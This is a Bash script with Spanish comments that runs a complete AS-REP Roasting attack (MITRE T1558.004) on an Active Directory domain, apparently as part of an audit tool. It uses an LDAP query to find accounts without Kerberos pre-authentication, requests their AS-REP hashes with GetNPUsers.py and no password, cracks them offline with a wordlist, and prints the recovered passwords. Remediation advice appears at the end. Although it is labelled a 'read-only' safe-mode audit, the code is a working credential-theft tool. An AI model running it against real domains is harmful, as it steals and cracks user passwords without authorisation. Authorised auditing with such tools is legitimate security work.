#!/usr/bin/env bash
# ============================================================
# asrep-roast.sh — AS-REP Roasting contra cuentas sin
#   pre-autenticación Kerberos (DONT_REQ_PREAUTH flag).
#
# Técnica: T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting
# Riesgo:  Un atacante SIN credenciales puede solicitar un AS-REP
#          y obtener un hash crackeado offline.
#
# Este script opera en modo SOLO LECTURA:
#   1. Consulta LDAP para identificar cuentas vulnerables
#   2. Solicita AS-REP vía Kerberos (GetNPUsers.py)
#   3. Intenta crackear los hashes offline con wordlist
#   4. Genera reporte con usuarios afectados y contraseñas halladas
# ============================================================
set -euo pipefail

WORKSPACE="${WORKSPACE:-/workspace}"
VENV="${VENV:-/opt/adaudit-venv}"
REPORT_DIR="${WORKSPACE}/reports/asrep_roast"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"
REPORT_FILE="${REPORT_DIR}/asrep_${TIMESTAMP}.txt"
HASHES_FILE="${REPORT_DIR}/asrep_hashes_${TIMESTAMP}.txt"
CRACKED_FILE="${REPORT_DIR}/asrep_cracked_${TIMESTAMP}.txt"
SCRIPTS_DIR="${WORKSPACE}/scripts"

mkdir -p "${REPORT_DIR}"

RED='\033[0;31m';  GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; BOLD='\033[1m';     NC='\033[0m'

ok()      { echo -e "${GREEN}[OK]${NC}    $*" | tee -a "${REPORT_FILE}"; }
fail()    { echo -e "${RED}[FAIL]${NC}  $*" | tee -a "${REPORT_FILE}"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*" | tee -a "${REPORT_FILE}"; }
info()    { echo -e "[INFO]  $*" | tee -a "${REPORT_FILE}"; }
section() { echo -e "\n${BLUE}${BOLD}══ $* ══${NC}\n" | tee -a "${REPORT_FILE}"; }

# ── Cargar variables ───────────────────────────────────────────────────────
if [[ -z "${DC_IP:-}" && -f "${WORKSPACE}/ad_env.sh" ]]; then
    # shellcheck disable=SC1090
    source "${WORKSPACE}/ad_env.sh"
fi

: "${DC_IP:?DC_IP no configurado}"
: "${AD_DOMAIN:?AD_DOMAIN no configurado}"
: "${LDAP_BASE_DN:?LDAP_BASE_DN no configurado}"

# ── Banner ─────────────────────────────────────────────────────────────────
cat <<EOF | tee "${REPORT_FILE}"
══════════════════════════════════════════════════════════════
 AS-REP Roasting — T1558.004
 Fecha   : $(date)
 DC IP   : ${DC_IP}
 Dominio : ${AD_DOMAIN}
 Técnica : Solicitar AS-REP sin pre-auth → crack offline
══════════════════════════════════════════════════════════════
EOF

# ── Activar venv ───────────────────────────────────────────────────────────
# shellcheck disable=SC1090
source "${VENV}/bin/activate"

# ── Guard de seguridad obligatorio ─────────────────────────────────────────
# SAFE_MODE debe ser exactamente 'true'. Default 'true' → fail-closed si la
# variable no llega inyectada desde el panel.
if [[ "${SAFE_MODE:-true}" != "true" ]]; then
    echo -e "${RED}[ABORT]${NC}  SAFE_MODE no es 'true'. Este script opera únicamente en laboratorio controlado." | tee -a "${REPORT_FILE}"
    echo -e "         Establece SAFE_MODE=true en Panel → Settings → Audit Flags." | tee -a "${REPORT_FILE}"
    exit 2
fi
echo -e "${GREEN}[OK]${NC}    SAFE_MODE=true — operación de solo lectura confirmada." | tee -a "${REPORT_FILE}"
echo "" | tee -a "${REPORT_FILE}"

# ── Paso 1: Identificar cuentas vulnerables vía LDAP ──────────────────────
section "Paso 1: Identificar cuentas sin pre-autenticación Kerberos"

VULN_USERS_FILE="${REPORT_DIR}/asrep_users_${TIMESTAMP}.txt"

# Filtro LDAP: DONT_REQ_PREAUTH = 0x400000 en userAccountControl
# (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
info "Buscando cuentas con DONT_REQ_PREAUTH en ${DC_IP}..."

if ldapsearch \
    -x \
    -H "ldap://${DC_IP}:${LDAP_PORT:-389}" \
    -b "${LDAP_BASE_DN}" \
    "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
    sAMAccountName userAccountControl distinguishedName \
    2>/dev/null > "${VULN_USERS_FILE}"; then

    VULN_COUNT=$(grep -c "^sAMAccountName:" "${VULN_USERS_FILE}" || true)
    mapfile -t VULN_LIST < <(grep "^sAMAccountName:" "${VULN_USERS_FILE}" | awk '{print $2}')

    if [[ ${VULN_COUNT} -eq 0 ]]; then
        ok "No se encontraron cuentas con DONT_REQ_PREAUTH. Dominio bien configurado."
        info "Reporte guardado en: ${REPORT_FILE}"
        exit 0
    fi

    fail "${VULN_COUNT} cuenta(s) vulnerable(s) encontradas:"
    for u in "${VULN_LIST[@]}"; do
        fail "  → ${u}"
    done
else
    # Fallback: usar datos del ldapdomaindump si el DC no está disponible
    warn "LDAP no disponible. Usando datos del último ldapdomaindump..."
    LATEST_DUMP=$(find "${WORKSPACE}/reports" -maxdepth 1 -name "ldapdomaindump_*" | sort -r | head -1)
    if [[ -z "${LATEST_DUMP}" ]]; then
        fail "Sin datos LDAP disponibles. Ejecuta una auditoría completa primero."
        exit 1
    fi
    mapfile -t VULN_LIST < <(python3 -c "
import json, sys
users = json.load(open('${LATEST_DUMP}/domain_users.json'))
for u in users:
    a = u['attributes']
    uac = a.get('userAccountControl', [0])[0]
    sam = a.get('sAMAccountName', [''])[0]
    if uac & 0x400000 and not (uac & 0x2):
        print(sam)
" 2>/dev/null)
    VULN_COUNT=${#VULN_LIST[@]}
    warn "Usando datos cacheados: ${VULN_COUNT} cuenta(s) con DONT_REQ_PREAUTH"
    for u in "${VULN_LIST[@]}"; do
        warn "  → ${u}"
    done
fi

# ── Paso 2: Solicitar hashes AS-REP ───────────────────────────────────────
section "Paso 2: Solicitar AS-REP hashes (GetNPUsers.py)"

if nc -zw3 "${DC_IP}" "${KDC_PORT:-88}" 2>/dev/null; then
    info "Puerto Kerberos (88) alcanzable. Solicitando AS-REP..."

    # Crear archivo con lista de usuarios vulnerables
    printf '%s\n' "${VULN_LIST[@]}" > "/tmp/asrep_targets_${TIMESTAMP}.txt"

    if GetNPUsers.py \
        "${AD_DOMAIN}/" \
        -usersfile "/tmp/asrep_targets_${TIMESTAMP}.txt" \
        -format hashcat \
        -outputfile "${HASHES_FILE}" \
        -no-pass \
        -dc-ip "${DC_IP}" \
        2>&1 | tee -a "${REPORT_FILE}"; then

        if [[ -f "${HASHES_FILE}" && -s "${HASHES_FILE}" ]]; then
            HASH_COUNT=$(grep -c "krb5asrep" "${HASHES_FILE}" || true)
            ok "${HASH_COUNT} hash(es) AS-REP capturados → ${HASHES_FILE}"
        else
            warn "GetNPUsers.py ejecutado pero sin hashes en el output."
            info "Posible causa: autenticación requerida o DC no accesible."
        fi
    else
        warn "GetNPUsers.py finalizó con error. Revisando si hay hashes parciales..."
    fi
else
    warn "Puerto 88 (Kerberos) no alcanzable. El DC puede estar apagado."
    info "Los hallazgos se basan en flags LDAP (DONT_REQ_PREAUTH detectado vía dump)."
    # Crear un archivo de hashes vacío para que el cracker maneje gracefully
    touch "${HASHES_FILE}"
fi

# ── Paso 3: Cracking offline ───────────────────────────────────────────────
section "Paso 3: Cracking offline (wordlist integrada)"

if [[ -f "${HASHES_FILE}" && -s "${HASHES_FILE}" ]]; then
    info "Iniciando cracking offline con wordlist integrada..."
    info "  Hashes a crackear: $(grep -c 'krb5asrep' "${HASHES_FILE}" || echo 0)"
    echo ""

    if python3 "${SCRIPTS_DIR}/crack-kerberos.py" \
        --hash-file "${HASHES_FILE}" \
        --builtin-wordlist \
        --output "${CRACKED_FILE}" \
        2>&1 | tee -a "${REPORT_FILE}"; then
        CRACKED_COUNT=$(grep -cv "^#" "${CRACKED_FILE}" 2>/dev/null || echo 0)
        if [[ ${CRACKED_COUNT} -gt 0 ]]; then
            fail "¡${CRACKED_COUNT} contraseña(s) CRACKEADAS!"
            while IFS=: read -r user pwd; do
                fail "  COMPROMETIDA: ${user} → contraseña: '${pwd}'"
            done < "${CRACKED_FILE}"
        else
            ok "Ninguna contraseña crackeada con la wordlist integrada."
            info "La cuenta sigue en riesgo (DONT_REQ_PREAUTH activo)."
            info "Un atacante real usaría rockyou.txt u otras wordlists más grandes."
        fi
    fi
else
    warn "Sin hashes para crackear. Resultado basado en análisis de flags LDAP."
fi

# ── Paso 4: Resumen y recomendaciones ─────────────────────────────────────
section "Paso 4: Hallazgos y recomendaciones"

echo "" | tee -a "${REPORT_FILE}"
echo "Cuentas vulnerables (DONT_REQ_PREAUTH):" | tee -a "${REPORT_FILE}"
for u in "${VULN_LIST[@]}"; do
    echo "  • ${u}" | tee -a "${REPORT_FILE}"
done

cat <<'RECS' | tee -a "${REPORT_FILE}"

RIESGO:
  Un atacante sin autenticación puede solicitar un ticket AS-REP para
  estas cuentas y obtener material criptográfico para crackear offline.
  No se requiere conocer la contraseña actual.

REMEDIACIÓN:
  1. Habilitar "Do not require Kerberos preauthentication" solo si es
     estrictamente necesario para aplicaciones legacy.
  2. Para la mayoría de cuentas: desactivar el flag en ADUC o via PowerShell:
     Set-ADUser -Identity <usuario> -DoesNotRequirePreAuth $false
  3. Rotar contraseñas de las cuentas afectadas con valores largos (20+).
  4. Monitorear Event ID 4768 con Pre-Auth Type 0x0 como indicador de ataque.

MITRE ATT&CK: T1558.004 — AS-REP Roasting
RECS

echo "" | tee -a "${REPORT_FILE}"
ok "Reporte completo: ${REPORT_FILE}"
info "Hashes: ${HASHES_FILE}"
[[ -f "${CRACKED_FILE}" ]] && info "Contraseñas crackeadas: ${CRACKED_FILE}"
